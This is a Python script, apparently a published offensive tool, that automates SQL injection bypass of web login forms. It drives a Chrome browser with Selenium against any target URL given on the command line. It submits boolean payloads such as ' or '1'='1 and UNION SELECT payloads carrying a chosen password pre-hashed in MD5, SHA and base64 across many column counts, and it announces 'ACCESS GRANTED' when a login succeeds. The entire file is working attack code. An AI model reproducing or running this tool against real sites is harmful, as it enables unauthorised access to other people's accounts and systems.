#!/usr/bin/python3
#
# tool for bypassing logins vulnerable to sql injection
# explanation: http://nzt-48.org/wp-admin/post.php?post=89
#
# written by Ruben Piña (tr3w)
# twitter: @tr3w_
# http://nzt-48.org
#
# run script for usage instructions
#

import sys
import re
import requests
import argparse


from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import UnexpectedAlertPresentException
from selenium.webdriver.common.keys import Keys

options = webdriver.ChromeOptions()
# Turn off to see the browser's value
#options.headless = True
browser = webdriver.Chrome(options=options)
login_password = "666666666"
    
#### Main function
def crack():
    
    

    bypass_injections = [
        "%s' AND 0 UNION SELECT %s WHERE '1",
        "%s\" AND 0 UNION SELECT %s WHERE \"1",     
        "%s\\' AND 0 UNION SELECT %s WHERE \\'1",
        "%s\\\" AND 0 UNION SELECT %s WHERE \\\"1"
    ]
    
    
        
    f = 0
    for bypass_injection in bypass_injections:
        
        browser.get(URL)
        
        for form in browser.find_elements('xpath', '//form' ):
            f += 1
            password_field = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]' % f)
            if len(password_field) > 1:
                sys.stdout.write('[x] Found form with more than 1 password field. Skipping...\n')
                continue
            elif len(password_field) == 0:
                sys.stdout.write('[x] No forms found in target URL!\n')
                return 0
            else:
                
                username_input = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]/preceding-sibling::input[@type="text"]' % f)
                if len(username_input) > 1:
                    sys.stdout.write('[+] More than one text field found. Proceed? (Y/N): ')
                elif len(username_input) == 0:
                    sys.stdout.write('[x] No text input fields found in target URL!\n')
                    return 0
                else:
    
                    # Boolean bypass
                    
                    injection = '%s" or TRUE --' % username
                    password = ''
                    inject(injection, password, f)
                    
                    injection = "%s' or TRUE --" % username
                    password = ""
                    inject(injection, password, f)
                    
                    injection = "%s' or '1'='1" % username
                    password = "' or '1'='1"
                    inject(injection, password, f)
                    
                    injection = '%s" or "1"="1' % username
                    password = '" or "1"="1'
                    inject(injection, password, f)
                    

                    
                    # Logic bypass
                    injection = username
                    password = ''
                    inject(injection, password, f)
                    
                    
                    # hash functions, feel free to edit
                    
                    import hashlib
                    import base64
                    functions = [ login_password, 
                                  "hashlib.md5(b'%s').hexdigest()",
                                  "hashlib.sha1(b'%s').hexdigest()",
                                  "hashlib.sha224(b'%s').hexdigest()",
                                  "hashlib.sha256(b'%s').hexdigest()",
                                  "hashlib.sha384(b'%s').hexdigest()",
                                  "hashlib.sha512(b'%s').hexdigest()",
                                  "hashlib.sha3_224(b'%s').hexdigest()",
                                  "hashlib.sha3_256(b'%s').hexdigest()",
                                  "hashlib.sha3_384(b'%s').hexdigest()",
                                  "hashlib.sha3_512(b'%s').hexdigest()", 
                                  "base64.b64encode(b'%s').decode('utf-8')"
                                  ]
                    
                    for fn in range(1, len(functions)):
                        functions[fn] = functions[fn]  % login_password
                        exec('functions[fn] = %s' % functions[fn])
                        
                    # Union bypass
                    injection_column_f = ['' for d in range(0, len(functions))]
                    count = 1
                    for n in range(0, max_columns):
                        
                        #injection_columns = login_password if not n else injection_columns + ",%s" 
                        #injection = bypass_injection %% (username, injection_columns)
                        #inject(injection, login_password, f)                        
                        
                        
                        for fn in range(0, len(functions)):
                        
                            injection_column_f[fn] = "'%s'" % functions[fn] if not n else injection_column_f[fn] + ",'%s'" % functions[fn]
                            injection = bypass_injection % (username, injection_column_f[fn])
                            inject(injection, login_password, f)
                                               


def inject(injection, password, f):
    password_field = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]' % f)
    username_input = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]/preceding-sibling::input[@type="text"]' % f )

    sys.stdout.write("[+] Injecting    %s" % injection)
    username_input[0].send_keys(injection)
    password_field[0].send_keys(login_password)
    password_field[0].send_keys(Keys.ENTER)


    look_for_password_field = browser.find_elements('xpath', '(//form)[%s]/descendant::input[@type="password"]' % f)
    if len(look_for_password_field) > 0:
        sys.stdout.write("    FAILED.\n")
        return 0
    else:
        sys.stdout.write("    SUCCESS!.\n")
        sys.stdout.write('\n[!] boom! i broke your code! ACCCESS GRANTED\n')
        sys.stdout.write('\t Login: %s\n' % injection)
        sys.stdout.write('\t Password: %s\n' % login_password)
        exit()
    


# Script entry point

# Command-line arguments parser
parser = argparse.ArgumentParser(description="Login Cracker")
parser.add_argument('-u', '--username', required=True, type=str, help="Username to log in")
parser.add_argument('-c', '--max_number_of_columns', required=False, default = 30, help="Maximum number of columns to try")
parser.add_argument('-t', '--target', required=True, help="Target URL. Example: http//target.url/login")
args = parser.parse_args()

username = args.username
max_columns = args.max_number_of_columns
URL = args.target


sys.stdout.write('[+] Ready to leverage attack.\n\n')

crack()
sys.stdout.write('\n[x] The login doesn\'t appear to be vulnerable to SQL injection\n')

